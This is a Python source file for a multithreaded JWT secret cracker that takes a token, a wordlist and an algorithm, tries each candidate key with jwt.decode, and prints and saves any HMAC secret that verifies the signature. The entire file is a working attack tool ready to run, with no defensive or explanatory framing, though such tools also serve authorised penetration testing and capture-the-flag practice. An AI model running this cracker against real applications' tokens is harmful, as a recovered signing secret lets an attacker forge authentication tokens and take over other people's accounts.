import jwt
import threading
from datetime import datetime

lock = threading.Lock()
found = False
results = []

def try_key(token, key, algo):
    global found
    if found:
        return
    try:
        jwt.decode(token, key.strip(), algorithms=[algo])
        with lock:
            found = True
            results.append({
                "secret": key.strip(),
                "timestamp": datetime.utcnow().isoformat()
            })
            print(f"[+] Secret found: {key.strip()}")
    except jwt.exceptions.InvalidSignatureError:
        pass
    except Exception as e:
        with lock:
            results.append({"error": str(e)})

def run_jwt_cracker():
    print("\n--- JWT Cracker ---")
    token = input("Enter JWT token: ").strip()
    wordlist_path = input("Enter path to wordlist: ").strip()
    algo = input("Enter JWT algorithm [default: HS256]: ").strip().upper()
    algo = algo if algo else "HS256"

    try:
        with open(wordlist_path, "r") as f:
            keys = f.readlines()
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    threads = []
    for key in keys:
        if found:
            break
        t = threading.Thread(target=try_key, args=(token, key, algo))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    with open("jwt_crack_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    if not found:
        print("[!] No valid secret found.")
    else:
        print("[+] JWT crack complete. Results saved to jwt_crack_results.txt.")

